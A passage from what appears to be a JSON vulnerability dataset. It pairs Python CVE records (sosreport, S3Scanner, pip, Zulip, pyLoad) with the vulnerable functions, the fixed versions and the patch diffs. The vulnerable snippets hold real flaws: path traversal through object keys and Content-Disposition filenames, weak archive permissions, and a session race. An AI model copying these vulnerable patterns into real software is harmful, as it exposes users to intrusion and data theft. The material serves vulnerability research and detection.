        "snippet": "def validate_translation_file(po_file):\n    \"\"\"\n    Validate a translation file and return errors if any.\n\n    This function combines both stderr and stdout output of the `msgfmt` in a\n    single variable.\n    \"\"\"\n    valid = True\n    output = \"\"\n\n    completed_process = subprocess.run(\n        ['msgfmt', '-v', '--strict', '--check', po_file],\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n    )\n\n    if completed_process.returncode != 0:\n        valid = False\n\n    msgfmt_stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n    msgfmt_stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n    output += f'{msgfmt_stdout}\\n{msgfmt_stderr}\\n'\n\n    try:\n      problems = i18n.validate.check_messages(po_file)\n    except Exception as e:\n      output += f'{e} {traceback.format_exc()}'\n      valid = False\n      problems = []\n    if problems:\n        valid = False\n\n    id_filler = textwrap.TextWrapper(width=79, initial_indent=\"  msgid: \", subsequent_indent=\" \" * 9)\n    tx_filler = textwrap.TextWrapper(width=79, initial_indent=\"  -----> \", subsequent_indent=\" \" * 9)\n    for problem in problems:\n        desc, msgid = problem[:2]\n        output += f\"{desc}\\n{id_filler.fill(msgid)}\\n\"\n        for translation in problem[2:]:\n            output += f\"{tx_filler.fill(translation)}\\n\"\n        output += \"\\n\"\n\n    return {\n        'valid': valid,\n        'output': output,\n    }"
      }
    ],
    "vul_patch": "--- a/scripts/validate_translation_files.py\n+++ b/scripts/validate_translation_files.py\n@@ -5,16 +5,41 @@\n     This function combines both stderr and stdout output of the `msgfmt` in a\n     single variable.\n     \"\"\"\n+    valid = True\n+    output = \"\"\n+\n     completed_process = subprocess.run(\n         ['msgfmt', '-v', '--strict', '--check', po_file],\n         stdout=subprocess.PIPE,\n         stderr=subprocess.PIPE,\n     )\n \n-    stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n-    stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n+    if completed_process.returncode != 0:\n+        valid = False\n+\n+    msgfmt_stdout = completed_process.stdout.decode(encoding='utf-8', errors='replace')\n+    msgfmt_stderr = completed_process.stderr.decode(encoding='utf-8', errors='replace')\n+    output += f'{msgfmt_stdout}\\n{msgfmt_stderr}\\n'\n+\n+    try:\n+      problems = i18n.validate.check_messages(po_file)\n+    except Exception as e:\n+      output += f'{e} {traceback.format_exc()}'\n+      valid = False\n+      problems = []\n+    if problems:\n+        valid = False\n+\n+    id_filler = textwrap.TextWrapper(width=79, initial_indent=\"  msgid: \", subsequent_indent=\" \" * 9)\n+    tx_filler = textwrap.TextWrapper(width=79, initial_indent=\"  -----> \", subsequent_indent=\" \" * 9)\n+    for problem in problems:\n+        desc, msgid = problem[:2]\n+        output += f\"{desc}\\n{id_filler.fill(msgid)}\\n\"\n+        for translation in problem[2:]:\n+            output += f\"{tx_filler.fill(translation)}\\n\"\n+        output += \"\\n\"\n \n     return {\n-        'valid': completed_process.returncode == 0,\n-        'output': f'{stdout}\\n{stderr}',\n+        'valid': valid,\n+        'output': output,\n     }\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-3171",
    "cve_description": "sosreport 3.2 uses weak permissions for generated sosreport archives, which allows local users with access to /var/tmp/ to obtain sensitive information by reading the contents of the archive.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/sosreport/sos",
    "patch_url": [
      "https://github.com/sosreport/sos/commit/d7759d3ddae5fe99a340c88a1d370d65cfa73fd6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_133_1",
        "commit": "48a99c9",
        "file_path": "sos/sosreport.py",
        "start_line": 1324,
        "end_line": 1352,
        "snippet": "    def final_work(self):\n        # this must come before archive creation to ensure that log\n        # files are closed and cleaned up at exit.\n        self._finish_logging()\n        # package up the results for the support organization\n        if not self.opts.build:\n            if not self.opts.quiet:\n                print(_(\"Creating compressed archive...\"))\n            # compression could fail for a number of reasons\n            try:\n                final_filename = self.archive.finalize(\n                    self.opts.compression_type)\n            except (OSError, IOError) as e:\n                if e.errno in fatal_fs_errors:\n                    self.ui_log.error(\"\")\n                    self.ui_log.error(\" %s while finalizing archive\"\n                                      % e.strerror)\n                    self.ui_log.error(\"\")\n                    self._exit(1)\n            except:\n                if self.opts.debug:\n                    raise\n                else:\n                    return False\n        else:\n            final_filename = self.archive.get_archive_path()\n        self.policy.display_results(final_filename, build=self.opts.build)\n        self.tempfile_util.clean()\n        return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_133_1",
        "commit": "d7759d3",
        "file_path": "sos/sosreport.py",
        "start_line": 1324,
        "end_line": 1355,
        "snippet": "    def final_work(self):\n        # this must come before archive creation to ensure that log\n        # files are closed and cleaned up at exit.\n        self._finish_logging()\n        # package up the results for the support organization\n        if not self.opts.build:\n            old_umask = os.umask(0o077)\n            if not self.opts.quiet:\n                print(_(\"Creating compressed archive...\"))\n            # compression could fail for a number of reasons\n            try:\n                final_filename = self.archive.finalize(\n                    self.opts.compression_type)\n            except (OSError, IOError) as e:\n                if e.errno in fatal_fs_errors:\n                    self.ui_log.error(\"\")\n                    self.ui_log.error(\" %s while finalizing archive\"\n                                      % e.strerror)\n                    self.ui_log.error(\"\")\n                    self._exit(1)\n            except:\n                if self.opts.debug:\n                    raise\n                else:\n                    return False\n            finally:\n                os.umask(old_umask)\n        else:\n            final_filename = self.archive.get_archive_path()\n        self.policy.display_results(final_filename, build=self.opts.build)\n        self.tempfile_util.clean()\n        return True"
      }
    ],
    "vul_patch": "--- a/sos/sosreport.py\n+++ b/sos/sosreport.py\n@@ -4,6 +4,7 @@\n         self._finish_logging()\n         # package up the results for the support organization\n         if not self.opts.build:\n+            old_umask = os.umask(0o077)\n             if not self.opts.quiet:\n                 print(_(\"Creating compressed archive...\"))\n             # compression could fail for a number of reasons\n@@ -22,6 +23,8 @@\n                     raise\n                 else:\n                     return False\n+            finally:\n+                os.umask(old_umask)\n         else:\n             final_filename = self.archive.get_archive_path()\n         self.policy.display_results(final_filename, build=self.opts.build)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-32061",
    "cve_description": "S3Scanner before 2.0.2 allows Directory Traversal via a crafted bucket, as demonstrated by a <Key>../ substring in a ListBucketResult element.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/sa7mon/S3Scanner",
    "patch_url": [
      "https://github.com/sa7mon/S3Scanner/commit/fafa30a3bd35b496b3f7db9bfc35b75a8a06bcd1"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_184_1",
        "commit": "6f7a679",
        "file_path": "S3Scanner/S3Service.py",
        "start_line": 291,
        "end_line": 314,
        "snippet": "    def download_file(self, dest_directory, bucket, verbose, obj):\n        \"\"\"\n        Download `obj` from `bucket` into `dest_directory`\n\n        :param str dest_directory: Directory to store the object into\n        :param S3Bucket bucket: Bucket to download the object from\n        :param bool verbose: Output verbose messages to the user\n        :param S3BucketObject obj: Object to downlaod\n        :return: None\n        \"\"\"\n        dest_file_path = pathlib.Path(normpath(dest_directory + obj.key))\n        if dest_file_path.exists():\n            if dest_file_path.stat().st_size == obj.size:\n                if verbose:\n                    print(f\"{bucket.name} | Skipping {obj.key} - already downloaded\")\n                return\n            else:\n                if verbose:\n                    print(f\"{bucket.name} | Re-downloading {obj.key} - local size differs from remote\")\n        else:\n            if verbose:\n                print(f\"{bucket.name} | Downloading {obj.key}\")\n        dest_file_path.parent.mkdir(parents=True, exist_ok=True)  # Equivalent to `mkdir -p`\n        self.s3_client.download_file(bucket.name, obj.key, str(dest_file_path))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_184_1",
        "commit": "fafa30a",
        "file_path": "S3Scanner/S3Service.py",
        "start_line": 292,
        "end_line": 319,
        "snippet": "    def download_file(self, dest_directory, bucket, verbose, obj):\n        \"\"\"\n        Download `obj` from `bucket` into `dest_directory`\n\n        :param str dest_directory: Directory to store the object into. _Must_ end in a slash\n        :param S3Bucket bucket: Bucket to download the object from\n        :param bool verbose: Output verbose messages to the user\n        :param S3BucketObject obj: Object to downlaod\n        :return: None\n        \"\"\"\n        dest_file_path = pathlib.Path(os.path.normpath(os.path.join(dest_directory, obj.key)))\n\n        if not self.is_safe_file_to_download(obj.key, dest_directory):\n            print(f\"{bucket.name} | Skipping file {obj.key}. File references a parent directory.\")\n            return\n        if dest_file_path.exists():\n            if dest_file_path.stat().st_size == obj.size:\n                if verbose:\n                    print(f\"{bucket.name} | Skipping {obj.key} - already downloaded\")\n                return\n            else:\n                if verbose:\n                    print(f\"{bucket.name} | Re-downloading {obj.key} - local size differs from remote\")\n        else:\n            if verbose:\n                print(f\"{bucket.name} | Downloading {obj.key}\")\n        dest_file_path.parent.mkdir(parents=True, exist_ok=True)  # Equivalent to `mkdir -p`\n        self.s3_client.download_file(bucket.name, obj.key, str(dest_file_path))"
      },
      {
        "id": "fix_py_184_2",
        "commit": "fafa30a",
        "file_path": "S3Scanner/S3Service.py",
        "start_line": 350,
        "end_line": 362,
        "snippet": "    def is_safe_file_to_download(self, file_to_check, dest_directory):\n        \"\"\"\n        Check if bucket object would be saved outside of `dest_directory` if downloaded.\n        AWS allows object keys to include relative path characters like '../' which can lead to a \n        path traversal-like issue where objects get saved outside of the intended directory.\n\n        :param string file_to_check: Bucket object key\n        :param string dest_directory: Path to directory to save file in\n        :return: bool\n        \"\"\"\n        file_to_check = os.path.abspath(os.path.join(dest_directory, file_to_check))\n        safe_dir = os.path.abspath(dest_directory)\n        return os.path.commonpath([safe_dir]) == os.path.commonpath([safe_dir, file_to_check])"
      }
    ],
    "vul_patch": "--- a/S3Scanner/S3Service.py\n+++ b/S3Scanner/S3Service.py\n@@ -2,13 +2,17 @@\n         \"\"\"\n         Download `obj` from `bucket` into `dest_directory`\n \n-        :param str dest_directory: Directory to store the object into\n+        :param str dest_directory: Directory to store the object into. _Must_ end in a slash\n         :param S3Bucket bucket: Bucket to download the object from\n         :param bool verbose: Output verbose messages to the user\n         :param S3BucketObject obj: Object to downlaod\n         :return: None\n         \"\"\"\n-        dest_file_path = pathlib.Path(normpath(dest_directory + obj.key))\n+        dest_file_path = pathlib.Path(os.path.normpath(os.path.join(dest_directory, obj.key)))\n+\n+        if not self.is_safe_file_to_download(obj.key, dest_directory):\n+            print(f\"{bucket.name} | Skipping file {obj.key}. File references a parent directory.\")\n+            return\n         if dest_file_path.exists():\n             if dest_file_path.stat().st_size == obj.size:\n                 if verbose:\n\n--- /dev/null\n+++ b/S3Scanner/S3Service.py\n@@ -0,0 +1,13 @@\n+    def is_safe_file_to_download(self, file_to_check, dest_directory):\n+        \"\"\"\n+        Check if bucket object would be saved outside of `dest_directory` if downloaded.\n+        AWS allows object keys to include relative path characters like '../' which can lead to a \n+        path traversal-like issue where objects get saved outside of the intended directory.\n+\n+        :param string file_to_check: Bucket object key\n+        :param string dest_directory: Path to directory to save file in\n+        :return: bool\n+        \"\"\"\n+        file_to_check = os.path.abspath(os.path.join(dest_directory, file_to_check))\n+        safe_dir = os.path.abspath(dest_directory)\n+        return os.path.commonpath([safe_dir]) == os.path.commonpath([safe_dir, file_to_check])\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-20916",
    "cve_description": "The pip package before 19.2 for Python allows Directory Traversal when a URL is given in an install command, because a Content-Disposition header can have ../ in a filename, as demonstrated by overwriting the /root/.ssh/authorized_keys file. This occurs in _download_http_url in _internal/download.py.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gzpan123/pip",
    "patch_url": [
      "https://github.com/gzpan123/pip/commit/a4c735b14a62f9cb864533808ac63936704f2ace"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_330_1",
        "commit": "9c8b2ea",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 65,
        "end_line": 69,
        "snippet": "__all__ = ['get_file_content',\n           'is_url', 'url_to_path', 'path_to_url',\n           'is_archive_file', 'unpack_vcs_link',\n           'unpack_file_url', 'is_vcs_url', 'is_file_url',\n           'unpack_http_url', 'unpack_url']"
      },
      {
        "id": "vul_py_330_2",
        "commit": "9c8b2ea",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 1053,
        "end_line": 1116,
        "snippet": "def _download_http_url(\n    link,  # type: Link\n    session,  # type: PipSession\n    temp_dir,  # type: str\n    hashes,  # type: Hashes\n    progress_bar  # type: str\n):\n    # type: (...) -> Tuple[str, str]\n    \"\"\"Download link url into temp_dir using provided session\"\"\"\n    target_url = link.url.split('#', 1)[0]\n    try:\n        resp = session.get(\n            target_url,\n            # We use Accept-Encoding: identity here because requests\n            # defaults to accepting compressed responses. This breaks in\n            # a variety of ways depending on how the server is configured.\n            # - Some servers will notice that the file isn't a compressible\n            #   file and will leave the file alone and with an empty\n            #   Content-Encoding\n            # - Some servers will notice that the file is already\n            #   compressed and will leave the file alone and will add a\n            #   Content-Encoding: gzip header\n            # - Some servers won't notice anything at all and will take\n            #   a file that's already been compressed and compress it again\n            #   and set the Content-Encoding: gzip header\n            # By setting this to request only the identity encoding We're\n            # hoping to eliminate the third case. Hopefully there does not\n            # exist a server which when given a file will notice it is\n            # already compressed and that you're not asking for a\n            # compressed file and will then decompress it before sending\n            # because if that's the case I don't think it'll ever be\n            # possible to make this work.\n            headers={\"Accept-Encoding\": \"identity\"},\n            stream=True,\n        )\n        resp.raise_for_status()\n    except requests.HTTPError as exc:\n        logger.critical(\n            \"HTTP error %s while getting %s\", exc.response.status_code, link,\n        )\n        raise\n\n    content_type = resp.headers.get('content-type', '')\n    filename = link.filename  # fallback\n    # Have a look at the Content-Disposition header for a better guess\n    content_disposition = resp.headers.get('content-disposition')\n    if content_disposition:\n        type, params = cgi.parse_header(content_disposition)\n        # We use ``or`` here because we don't want to use an \"empty\" value\n        # from the filename param.\n        filename = params.get('filename') or filename\n    ext = splitext(filename)[1]\n    if not ext:\n        ext = mimetypes.guess_extension(content_type)\n        if ext:\n            filename += ext\n    if not ext and link.url != resp.url:\n        ext = os.path.splitext(resp.url)[1]\n        if ext:\n            filename += ext\n    file_path = os.path.join(temp_dir, filename)\n    with open(file_path, 'wb') as content_file:\n        _download_url(resp, link, content_file, hashes, progress_bar)\n    return file_path, content_type"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_330_1",
        "commit": "a4c735b14a62f9cb864533808ac63936704f2ace",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 65,
        "end_line": 70,
        "snippet": "__all__ = ['get_file_content',\n           'is_url', 'url_to_path', 'path_to_url',\n           'is_archive_file', 'unpack_vcs_link',\n           'unpack_file_url', 'is_vcs_url', 'is_file_url',\n           'unpack_http_url', 'unpack_url',\n           'parse_content_disposition', 'sanitize_content_filename']"
      },
      {
        "id": "fix_py_330_2",
        "commit": "a4c735b14a62f9cb864533808ac63936704f2ace",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 1077,
        "end_line": 1137,
        "snippet": "def _download_http_url(\n    link,  # type: Link\n    session,  # type: PipSession\n    temp_dir,  # type: str\n    hashes,  # type: Hashes\n    progress_bar  # type: str\n):\n    # type: (...) -> Tuple[str, str]\n    \"\"\"Download link url into temp_dir using provided session\"\"\"\n    target_url = link.url.split('#', 1)[0]\n    try:\n        resp = session.get(\n            target_url,\n            # We use Accept-Encoding: identity here because requests\n            # defaults to accepting compressed responses. This breaks in\n            # a variety of ways depending on how the server is configured.\n            # - Some servers will notice that the file isn't a compressible\n            #   file and will leave the file alone and with an empty\n            #   Content-Encoding\n            # - Some servers will notice that the file is already\n            #   compressed and will leave the file alone and will add a\n            #   Content-Encoding: gzip header\n            # - Some servers won't notice anything at all and will take\n            #   a file that's already been compressed and compress it again\n            #   and set the Content-Encoding: gzip header\n            # By setting this to request only the identity encoding We're\n            # hoping to eliminate the third case. Hopefully there does not\n            # exist a server which when given a file will notice it is\n            # already compressed and that you're not asking for a\n            # compressed file and will then decompress it before sending\n            # because if that's the case I don't think it'll ever be\n            # possible to make this work.\n            headers={\"Accept-Encoding\": \"identity\"},\n            stream=True,\n        )\n        resp.raise_for_status()\n    except requests.HTTPError as exc:\n        logger.critical(\n            \"HTTP error %s while getting %s\", exc.response.status_code, link,\n        )\n        raise\n\n    content_type = resp.headers.get('content-type', '')\n    filename = link.filename  # fallback\n    # Have a look at the Content-Disposition header for a better guess\n    content_disposition = resp.headers.get('content-disposition')\n    if content_disposition:\n        filename = parse_content_disposition(content_disposition, filename)\n    ext = splitext(filename)[1]\n    if not ext:\n        ext = mimetypes.guess_extension(content_type)\n        if ext:\n            filename += ext\n    if not ext and link.url != resp.url:\n        ext = os.path.splitext(resp.url)[1]\n        if ext:\n            filename += ext\n    file_path = os.path.join(temp_dir, filename)\n    with open(file_path, 'wb') as content_file:\n        _download_url(resp, link, content_file, hashes, progress_bar)\n    return file_path, content_type"
      },
      {
        "id": "fix_py_330_3",
        "commit": "a4c735b14a62f9cb864533808ac63936704f2ace",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 1054,
        "end_line": 1059,
        "snippet": "def sanitize_content_filename(filename):\n    # type: (str) -> str\n    \"\"\"\n    Sanitize the \"filename\" value from a Content-Disposition header.\n    \"\"\"\n    return os.path.basename(filename)"
      },
      {
        "id": "fix_py_330_4",
        "commit": "a4c735b14a62f9cb864533808ac63936704f2ace",
        "file_path": "src/pip/_internal/download.py",
        "start_line": 1052,
        "end_line": 1076,
        "snippet": "\n\ndef sanitize_content_filename(filename):\n    # type: (str) -> str\n    \"\"\"\n    Sanitize the \"filename\" value from a Content-Disposition header.\n    \"\"\"\n    return os.path.basename(filename)\n\n\ndef parse_content_disposition(content_disposition, default_filename):\n    # type: (str, str) -> str\n    \"\"\"\n    Parse the \"filename\" value from a Content-Disposition header, and\n    return the default filename if the result is empty.\n    \"\"\"\n    _type, params = cgi.parse_header(content_disposition)\n    filename = params.get('filename')\n    if filename:\n        # We need to sanitize the filename to prevent directory traversal\n        # in case the filename contains \"..\" path parts.\n        filename = sanitize_content_filename(filename)\n    return filename or default_filename\n\n"
      }
    ],
    "vul_patch": "--- a/src/pip/_internal/download.py\n+++ b/src/pip/_internal/download.py\n@@ -2,4 +2,5 @@\n            'is_url', 'url_to_path', 'path_to_url',\n            'is_archive_file', 'unpack_vcs_link',\n            'unpack_file_url', 'is_vcs_url', 'is_file_url',\n-           'unpack_http_url', 'unpack_url']\n+           'unpack_http_url', 'unpack_url',\n+           'parse_content_disposition', 'sanitize_content_filename']\n\n--- a/src/pip/_internal/download.py\n+++ b/src/pip/_internal/download.py\n@@ -45,10 +45,7 @@\n     # Have a look at the Content-Disposition header for a better guess\n     content_disposition = resp.headers.get('content-disposition')\n     if content_disposition:\n-        type, params = cgi.parse_header(content_disposition)\n-        # We use ``or`` here because we don't want to use an \"empty\" value\n-        # from the filename param.\n-        filename = params.get('filename') or filename\n+        filename = parse_content_disposition(content_disposition, filename)\n     ext = splitext(filename)[1]\n     if not ext:\n         ext = mimetypes.guess_extension(content_type)\n\n--- /dev/null\n+++ b/src/pip/_internal/download.py\n@@ -0,0 +1,6 @@\n+def sanitize_content_filename(filename):\n+    # type: (str) -> str\n+    \"\"\"\n+    Sanitize the \"filename\" value from a Content-Disposition header.\n+    \"\"\"\n+    return os.path.basename(filename)\n\n--- /dev/null\n+++ b/src/pip/_internal/download.py\n@@ -0,0 +1,24 @@\n+\n+\n+def sanitize_content_filename(filename):\n+    # type: (str) -> str\n+    \"\"\"\n+    Sanitize the \"filename\" value from a Content-Disposition header.\n+    \"\"\"\n+    return os.path.basename(filename)\n+\n+\n+def parse_content_disposition(content_disposition, default_filename):\n+    # type: (str, str) -> str\n+    \"\"\"\n+    Parse the \"filename\" value from a Content-Disposition header, and\n+    return the default filename if the result is empty.\n+    \"\"\"\n+    _type, params = cgi.parse_header(content_disposition)\n+    filename = params.get('filename')\n+    if filename:\n+        # We need to sanitize the filename to prevent directory traversal\n+        # in case the filename contains \"..\" path parts.\n+        filename = sanitize_content_filename(filename)\n+    return filename or default_filename\n+\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-24751",
    "cve_description": "Zulip is an open source group chat application. Starting with version 4.0 and prior to version 4.11, Zulip is vulnerable to a race condition during account deactivation, where a simultaneous access by the user being deactivated may, in rare cases, allow continued access by the deactivated user. A patch is available in version 4.11 on the 4.x branch and version 5.0-rc1 on the 5.x branch. Upgrading to a fixed version will, as a side effect, deactivate any cached sessions that may have been leaked through this bug. There are currently no known workarounds.",
    "cwe_info": {
      "CWE-362": {
        "name": "Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')",
        "description": "The product contains a concurrent code sequence that requires temporary, exclusive access to a shared resource, but a timing window exists in which the shared resource can be modified by another code sequence operating concurrently."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/62ba8e455d8f460001d9fb486a6dabfd1ed67717"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_424_1",
        "commit": "7650b5a",
        "file_path": "zerver/lib/actions.py",
        "start_line": 1390,
        "end_line": 1457,
        "snippet": "def do_deactivate_user(\n    user_profile: UserProfile, _cascade: bool = True, *, acting_user: Optional[UserProfile]\n) -> None:\n    if not user_profile.is_active:\n        return\n\n    if _cascade:\n        # We need to deactivate bots before the target user, to ensure\n        # that a failure partway through this function cannot result\n        # in only the user being deactivated.\n        bot_profiles = get_active_bots_owned_by_user(user_profile)\n        for profile in bot_profiles:\n            do_deactivate_user(profile, _cascade=False, acting_user=acting_user)\n\n    with transaction.atomic():\n        if user_profile.realm.is_zephyr_mirror_realm:  # nocoverage\n            # For zephyr mirror users, we need to make them a mirror dummy\n            # again; otherwise, other users won't get the correct behavior\n            # when trying to send messages to this person inside Zulip.\n            #\n            # Ideally, we need to also ensure their zephyr mirroring bot\n            # isn't running, but that's a separate issue.\n            user_profile.is_mirror_dummy = True\n            user_profile.save(update_fields=[\"is_mirror_dummy\"])\n\n        change_user_is_active(user_profile, False)\n\n        delete_user_sessions(user_profile)\n        clear_scheduled_emails(user_profile.id)\n        revoke_invites_generated_by_user(user_profile)\n\n        event_time = timezone_now()\n        RealmAuditLog.objects.create(\n            realm=user_profile.realm,\n            modified_user=user_profile,\n            acting_user=acting_user,\n            event_type=RealmAuditLog.USER_DEACTIVATED,\n            event_time=event_time,\n            extra_data=orjson.dumps(\n                {\n                    RealmAuditLog.ROLE_COUNT: realm_user_count_by_role(user_profile.realm),\n                }\n            ).decode(),\n        )\n        do_increment_logging_stat(\n            user_profile.realm,\n            COUNT_STATS[\"active_users_log:is_bot:day\"],\n            user_profile.is_bot,\n            event_time,\n            increment=-1,\n        )\n        if settings.BILLING_ENABLED:\n            update_license_ledger_if_needed(user_profile.realm, event_time)\n\n    event = dict(\n        type=\"realm_user\",\n        op=\"remove\",\n        person=dict(user_id=user_profile.id, full_name=user_profile.full_name),\n    )\n    send_event(user_profile.realm, event, active_user_ids(user_profile.realm_id))\n\n    if user_profile.is_bot:\n        event = dict(\n            type=\"realm_bot\",\n            op=\"remove\",\n            bot=dict(user_id=user_profile.id, full_name=user_profile.full_name),\n        )\n        send_event(user_profile.realm, event, bot_owner_user_ids(user_profile))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_424_1",
        "commit": "62ba8e455d8f460001d9fb486a6dabfd1ed67717",
        "file_path": "zerver/lib/actions.py",
        "start_line": 1390,
        "end_line": 1457,
        "snippet": "def do_deactivate_user(\n    user_profile: UserProfile, _cascade: bool = True, *, acting_user: Optional[UserProfile]\n) -> None:\n    if not user_profile.is_active:\n        return\n\n    if _cascade:\n        # We need to deactivate bots before the target user, to ensure\n        # that a failure partway through this function cannot result\n        # in only the user being deactivated.\n        bot_profiles = get_active_bots_owned_by_user(user_profile)\n        for profile in bot_profiles:\n            do_deactivate_user(profile, _cascade=False, acting_user=acting_user)\n\n    with transaction.atomic():\n        if user_profile.realm.is_zephyr_mirror_realm:  # nocoverage\n            # For zephyr mirror users, we need to make them a mirror dummy\n            # again; otherwise, other users won't get the correct behavior\n            # when trying to send messages to this person inside Zulip.\n            #\n            # Ideally, we need to also ensure their zephyr mirroring bot\n            # isn't running, but that's a separate issue.\n            user_profile.is_mirror_dummy = True\n            user_profile.save(update_fields=[\"is_mirror_dummy\"])\n\n        change_user_is_active(user_profile, False)\n\n        clear_scheduled_emails(user_profile.id)\n        revoke_invites_generated_by_user(user_profile)\n\n        event_time = timezone_now()\n        RealmAuditLog.objects.create(\n            realm=user_profile.realm,\n            modified_user=user_profile,\n            acting_user=acting_user,\n            event_type=RealmAuditLog.USER_DEACTIVATED,\n            event_time=event_time,\n            extra_data=orjson.dumps(\n                {\n                    RealmAuditLog.ROLE_COUNT: realm_user_count_by_role(user_profile.realm),\n                }\n            ).decode(),\n        )\n        do_increment_logging_stat(\n            user_profile.realm,\n            COUNT_STATS[\"active_users_log:is_bot:day\"],\n            user_profile.is_bot,\n            event_time,\n            increment=-1,\n        )\n        if settings.BILLING_ENABLED:\n            update_license_ledger_if_needed(user_profile.realm, event_time)\n\n    delete_user_sessions(user_profile)\n    event = dict(\n        type=\"realm_user\",\n        op=\"remove\",\n        person=dict(user_id=user_profile.id, full_name=user_profile.full_name),\n    )\n    send_event(user_profile.realm, event, active_user_ids(user_profile.realm_id))\n\n    if user_profile.is_bot:\n        event = dict(\n            type=\"realm_bot\",\n            op=\"remove\",\n            bot=dict(user_id=user_profile.id, full_name=user_profile.full_name),\n        )\n        send_event(user_profile.realm, event, bot_owner_user_ids(user_profile))"
      }
    ],
    "vul_patch": "--- a/zerver/lib/actions.py\n+++ b/zerver/lib/actions.py\n@@ -25,7 +25,6 @@\n \n         change_user_is_active(user_profile, False)\n \n-        delete_user_sessions(user_profile)\n         clear_scheduled_emails(user_profile.id)\n         revoke_invites_generated_by_user(user_profile)\n \n@@ -52,6 +51,7 @@\n         if settings.BILLING_ENABLED:\n             update_license_ledger_if_needed(user_profile.realm, event_time)\n \n+    delete_user_sessions(user_profile)\n     event = dict(\n         type=\"realm_user\",\n         op=\"remove\",\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-47890",
    "cve_description": "pyLoad 0.5.0 is vulnerable to Unrestricted File Upload.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/pyload/pyload",
    "patch_url": [
      "https://github.com/pyload/pyload/commit/695bb70cd88608dc4fee18a6a7ecb66722ebfd8f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_154_1",
        "commit": "14a9f11",
        "file_path": "src/pyload/core/api/__init__.py",
        "start_line": 418,
        "end_line": 452,
        "snippet": "    def add_package(self, name, links, dest=Destination.QUEUE):\n        \"\"\"\n        Adds a package, with links to desired destination.\n\n        :param name: name of the new package\n        :param links: list of urls\n        :param dest: `Destination`\n        :return: package id of the new package\n        \"\"\"\n        if self.pyload.config.get(\"general\", \"folder_per_package\"):\n            folder = name\n        else:\n            folder = \"\"\n\n        folder = (\n            folder.replace(\"http://\", \"\")\n            .replace(\"https://\", \"\")\n            .replace(\":\", \"\")\n            .replace(\"/\", \"_\")\n            .replace(\"\\\\\", \"_\")\n        )\n\n        package_id = self.pyload.files.add_package(name, folder, Destination(dest))\n\n        self.pyload.files.add_links(links, package_id)\n\n        self.pyload.log.info(\n            self._(\"Added package {name} containing {count:d} links\").format(\n                name=name, count=len(links)\n            )\n        )\n\n        self.pyload.files.save()\n\n        return package_id"
      },
      {
        "id": "vul_py_154_2",
        "commit": "14a9f11",
        "file_path": "src/pyload/webui/app/blueprints/json_blueprint.py",
        "start_line": 190,
        "end_line": 204,
        "snippet": "def edit_package():\n    api = flask.current_app.config[\"PYLOAD_API\"]\n    try:\n        id = int(flask.request.form[\"pack_id\"])\n        data = {\n            \"name\": flask.request.form[\"pack_name\"],\n            \"_folder\": flask.request.form[\"pack_folder\"],\n            \"password\": flask.request.form[\"pack_pws\"],\n        }\n\n        api.set_package_data(id, data)\n        return jsonify(response=\"success\")\n\n    except Exception:\n        return jsonify(False), 500"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_154_1",
        "commit": "695bb70",
        "file_path": "src/pyload/core/api/__init__.py",
        "start_line": 418,
        "end_line": 454,
